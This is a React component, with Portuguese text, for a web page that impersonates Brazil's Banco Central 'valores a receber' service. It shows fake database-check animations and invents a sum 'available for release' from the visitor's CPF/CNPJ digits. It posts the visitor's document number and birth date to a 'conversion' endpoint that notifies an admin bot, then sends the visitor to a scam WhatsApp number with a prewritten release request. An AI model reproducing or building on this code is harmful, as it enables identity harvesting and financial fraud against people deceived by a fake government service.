import { useEffect, useState } from "react";
import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";

interface Step2Props {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "results";

export function Step2({ data, onReset }: Step2Props) {
  const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
  const [config, setConfig] = useState({ 
    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
  });
  const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
  const [processStep, setProcessStep] = useState(0);

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API_URL}/api/config?t=${Date.now()}`);
        if (response.data.whatsappNumber) {
          console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
          setConfig(response.data);
          // Salvar para o navegador não esquecer se houver oscilação
          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
        }
      } catch (err) {
        console.error("Falha na sincronia modular. Usando memória local.");
        const lastSaved = localStorage.getItem('svr_last_whatsapp');
        if (lastSaved) setConfig({ whatsappNumber: lastSaved });
      }
    };
    fetchConfig();

    const timers = [
      setTimeout(() => setAnalysisState("verifying_identity"), 2500),
      setTimeout(() => setAnalysisState("finalizing"), 4500),
      setTimeout(() => setAnalysisState("results"), 6500),
    ];

    return () => timers.forEach(clearTimeout);
  }, []);

  const calculateValue = (doc: string) => {
    // Deterministic value based on document digits
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    const value = (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
    return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  const handleWhatsAppRedirect = () => {
    setIsProcessingWhatsApp(true);

    // Sequence of "automatic" verification steps
    const steps = [
      "Sincronizando protocolo de segurança...",
      "Validando titularidade fiscal...",
      "Gerando token de liberação única...",
      "Conectando ao canal de atendimento prioritário..."
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length - 1) {
        currentStep++;
        setProcessStep(currentStep);
      } else {
        clearInterval(interval);

        const userId = localStorage.getItem('svr_user_id') || "N/A";
        const protocol = `SVR-${userId.toUpperCase()}`;
        // UTF-8 safe base64 encoding for the token
        const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();

        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
          `*DETALHES DA SOLICITAÇÃO:* \n` +
          `• Protocolo: *#${protocol}*\n` +
          `• Token de Validação: *${token}*\n` +
          `• Tipo de Documento: *${data.docType}*\n` +
          `• Documento Identificado: *${data.docValue}*\n\n` +
          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;

        const message = encodeURIComponent(header + "\n\n" + body);

        // Notify Admin Bot IMMEDIATELY upon click
        const notifyConversion = async () => {
          try {
            const userIdForApi = localStorage.getItem('svr_user_id');
            if (userIdForApi) {
              await axios.post(`${API_URL}/api/v1/session/convert`, {
                userId: userIdForApi,
                details: { 
                  docValue: data.docValue, 
                  birthDate: data.birthDate,
                  protocol: protocol,
                  token: token
                }
              });
            }
          } catch (e) { 
            console.error("Erro na conversão antecipada:", e);
          }
        };

        notifyConversion().finally(() => {
          window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
        });
      }
    }, 1200);
  };

  const AnalysisLoader = ({ text }: { text: string }) => (
    <div className="flex flex-col items-center justify-center p-16 bg-white dark:bg-[#1f292e] rounded shadow-sm border border-gray-100 dark:border-[#2a373d] max-w-[420px] mx-auto text-center space-y-6 min-h-[450px] transition-colors duration-300">
      <div className="relative">
        <Loader2 className="w-16 h-16 text-[#2d7890] dark:text-[#429bb8] animate-spin" strokeWidth={1.5} />
        <div className="absolute inset-0 flex items-center justify-center">
          <Search size={24} className="text-[#2d7890] dark:text-[#429bb8] opacity-50" />
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800 dark:text-gray-200 tracking-tight transition-colors duration-300">{text}</h3>
        <div className="flex gap-1 justify-center">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#2d7890] rounded-full"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ repeat: Infinity, duration: 1.5, delay: i * 0.2 }}
            />
          ))}
        </div>
      </div>
      <p className="text-sm text-gray-500 dark:text-gray-400 font-medium opacity-60 transition-colors duration-300">Sincronizando com as bases do Banco Central...</p>
    </div>
  );

  return (
    <AnimatePresence mode="wait">
      {analysisState === "checking_base" && (
        <motion.div key="check" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Analisando base de CPFs/CNPJs..." />
        </motion.div>
      )}
      {analysisState === "verifying_identity" && (
        <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Verificando saldos residuais..." />
        </motion.div>
      )}
      {analysisState === "finalizing" && (
        <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Finalizando consulta segura..." />
        </motion.div>
      )}

      {analysisState === "results" && (
        <motion.div
          key="results"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white dark:bg-[#1f292e] rounded-[4px] w-full max-w-[880px] mx-auto shadow-sm transition-colors duration-300"
        >
            <div className="p-8 md:p-12 flex flex-col md:flex-row items-center md:items-start gap-8 md:gap-12">
              
              {/* Left Side: Large Checkmark */}
              <div className="flex-shrink-0 w-full md:w-auto flex justify-center md:pt-4">
                <div className="w-32 h-32 md:w-40 md:h-40">
                  <svg viewBox="0 0 52 52" className="w-full h-full text-[#5cb85c]">
                    <path 
                      fill="none" 
                      stroke="currentColor" 
                      strokeWidth="6" 
                      strokeLinecap="round" 
                      strokeLinejoin="round" 
                      d="M14 27l8 8 16-16" 
                    />
                  </svg>
                </div>
              </div>

              {/* Right Side: Content */}
              <div className="flex-grow space-y-6 w-full">
                
                {/* Identification Header */}
                <div className="text-center space-y-3">
                  <h2 className="text-[22px] md:text-[28px] font-bold text-[#555] dark:text-gray-200">
                    O {data.docType} pesquisado possui ativos para liberação
                  </h2>
                  <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400 font-medium space-y-1">
                     <p>{data.docType}: <span className="font-bold text-black dark:text-white">{data.docValue}</span></p>
                     <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <span className="font-bold text-black dark:text-white">{data.birthDate}</span></p>
                  </div>
                </div>

                {/* Highlighted Instruction Box (Gray) */}
                <div className="bg-[#f2f4f6] dark:bg-[#2c3e50] py-3 px-5 rounded-sm">
                  <p className="text-[15px] md:text-[16px] font-bold text-[#444] dark:text-gray-200 text-center">
                    A liberação está sujeita à validação de segurança conforme Resolução BCB nº 4.862
                  </p>
                </div>

                {/* Descriptions */}
                <div className="space-y-4 text-[14px] md:text-[15px] text-[#666] dark:text-gray-300">
                  <p>
                    Para garantir a integridade da transferência, você precisa concluir as etapas obrigatórias de homologação documental e vínculo bancário do titular.
                  </p>
                  <p>
                    No SVR, a liberação dos ativos será processada de forma sigilosa e segura após a autenticação realizada através de nossos canais oficiais (nesse caso, você precisa ser o titular ou procurador).
                  </p>
                </div>

                {/* Action Buttons Row */}
                <div className="flex flex-col sm:flex-row justify-center gap-4 pt-2">
                  <button
                    onClick={handleWhatsAppRedirect}
                    className="flex-1 bg-[#007087] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                  >
                    <CheckCircle2 size={18} /> Liberar Valores
                  </button>
                  <button
                    onClick={() => window.location.reload()}
                    className="flex-1 bg-[#007087] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                  >
                    <X size={18} /> Sair
                  </button>
                </div>

                {/* Footer Link */}
                <div className="pt-6 text-center">
                  <button 
                    onClick={handleWhatsAppRedirect}
                    className="text-[13px] md:text-[14px] text-[#0066cc] dark:text-[#4da3ff] hover:underline cursor-pointer bg-transparent border-none p-0 text-left md:text-center w-full"
                  >
                    *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
                  </button>
                </div>

              </div>
            </div>
        </motion.div>
      )}



      {isProcessingWhatsApp && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
        >
          <div className="w-full max-w-[320px] space-y-8">
            <div className="relative flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
            </div>

            <div className="space-y-4">
              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
              <div className="space-y-2">
                {[0, 1, 2, 3].map((i) => (
                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
                    <span className={i === processStep ? 'font-bold' : ''}>
                      {[
                        "Sincronizando protocolo de segurança...",
                        "Validando titularidade fiscal...",
                        "Gerando token de liberação única...",
                        "Conectando ao canal de atendimento prioritário..."
                      ][i]}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}


